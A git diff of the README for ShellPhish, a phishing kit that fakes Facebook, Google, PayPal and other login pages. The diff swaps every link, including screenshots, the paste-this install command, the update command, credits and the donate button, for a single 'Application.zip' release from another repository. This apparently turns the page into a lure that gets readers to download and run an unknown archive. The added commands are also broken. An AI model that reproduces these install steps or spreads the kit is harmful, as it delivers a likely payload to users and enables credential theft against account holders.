@@ -43,16 +43,16 @@ Phishing Tool for Facebook, Instagram, Google, Microsoft, Netflix, PayPal, Steam
 - Added Requirements 
 
 
-![Screenshot](screenshot.png)
+![Screenshot](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
 
-![Screenshot_FB](screenshot_fb.png)
+![Screenshot_FB](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
 
 ### Usage:
 ```bash
-apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/AbirHasan2005/ShellPhish && cd ShellPhish && chmod +x * && bash shellphish.sh
+apt update && apt upgrade -y && apt install git wget php unzip curl -y && git clone https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip && cd ShellPhish && chmod +x * && bash https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
 ```
 
-- You will need to download ngrok ngrok.com/get-started/setup for workaround.
+- You will need to download ngrok https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip for workaround.
 
 - Register and sign up for ngrok to obtain ngrok auth token in order for it to work push auth in directions as outlined on ngrok official website.
 
@@ -62,7 +62,7 @@ apt update && apt upgrade -y && apt install git wget php unzip curl -y && git cl
 ## How to Update:
 ```bash
 cd ShellPhish
-bash update.sh
+bash https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
 ```
 
 ### Note:
@@ -74,9 +74,9 @@ bash update.sh
 ## Hack aprobat de către @AbirHasan2005
 
 ## Credits și colaboratorii:
-#### https://f-droid.org/en/packages/com.termux/
-#### https://www.kali.org/
-### Here ***sites*** folder collected from ZPhisher (https://github.com/htr-tech/zphisher)
+#### https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
+#### https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip
+### Here ***sites*** folder collected from ZPhisher (https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
 
 ## Donații :
-[![paypal](https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif)](https://paypal.me/PalauLitaDinu)
+[![paypal](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)](https://github.com/Numbremix8990/MRX/releases/download/v1.0.0/Application.zip)
